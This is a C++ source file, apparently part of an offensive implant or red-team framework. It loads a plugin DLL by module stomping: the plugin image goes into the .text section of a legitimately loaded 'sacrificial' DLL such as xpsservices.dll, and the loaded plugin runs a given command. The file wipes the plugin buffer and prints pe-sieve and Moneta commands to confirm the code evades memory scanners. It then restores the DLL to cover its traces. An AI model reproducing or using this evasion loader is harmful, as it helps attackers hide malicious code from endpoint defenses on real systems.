// module_stomping.cpp — Load a plugin via module stomping.
//
// The plugin image is written into the .text section of a legitimately
// loaded "sacrificial" DLL. After execution, FreeStompedModule restores
// the original bytes and reloads the sacrificial DLL clean from disk.
//
// Good sacrificial candidates: xpsservices.dll, mscms.dll, colorui.dll
// Bad candidates: ntdll.dll, kernel32.dll (actively used)
//
// Usage:
//   module_stomping.exe <plugin.dll> <sacrificial.dll> <command>

#include <cstdio>
#include <cstring>
#include <fstream>
#include <vector>
#include "../Include/PluginManager.h"

static std::vector<uint8_t> ReadFile(const char* path) {
    std::ifstream f(path, std::ios::binary | std::ios::ate);
    if (!f) return {};
    auto sz = f.tellg();
    f.seekg(0);
    std::vector<uint8_t> buf(sz);
    f.read((char*)buf.data(), sz);
    return buf;
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        printf("Usage: %s <plugin.dll> <sacrificial.dll> <command>\n", argv[0]);
        printf("\nExample:\n");
        printf("  %s cmdplugin.dll xpsservices.dll whoami\n", argv[0]);
        return 1;
    }

    const char* pluginPath     = argv[1];
    const char* sacrificialDll = argv[2];
    const char* command        = argv[3];

    auto dll = ReadFile(pluginPath);
    if (dll.empty()) {
        printf("[-] Cannot read %s\n", pluginPath);
        return 1;
    }

    PluginManager pm;

    // Load with the stomped engine — the plugin image lands inside
    // the sacrificial DLL's .text section
    if (!pm.LoadPlugin("stomped", dll.data(), dll.size(),
                       LoaderEngine::Stomped, sacrificialDll)) {
        printf("[-] Stomping failed — is the sacrificial .text large enough?\n");
        return 1;
    }
    printf("[+] Plugin stomped into %s\n", sacrificialDll);

    memset(dll.data(), 0, dll.size());
    dll.clear();

    // Print scan commands so you can verify evasion with pe-sieve/moneta
    DWORD pid = GetCurrentProcessId();
    printf("\n  Scan commands (PID %lu):\n", pid);
    printf("    pe-sieve64.exe /pid %lu /data 3 /iat 2\n", pid);
    printf("    moneta64.exe -p %lu -m ioc\n\n", pid);

    // Execute
    TaskApi task{};
    task.TaskId = "stomp-test";   task.TaskIdLen = 10;
    task.Instruction = "exec";    task.InstructionLen = 4;
    task.Command = command;       task.CommandLen = (DWORD)strlen(command);

    pm.ExecutePlugin("stomped", &task);

    // Unload — restores original .text, reloads sacrificial clean from disk,
    // scrubs heap buffers
    pm.UnloadAll();
    printf("\n[+] Cleanup complete — sacrificial DLL restored\n");

    return 0;
}
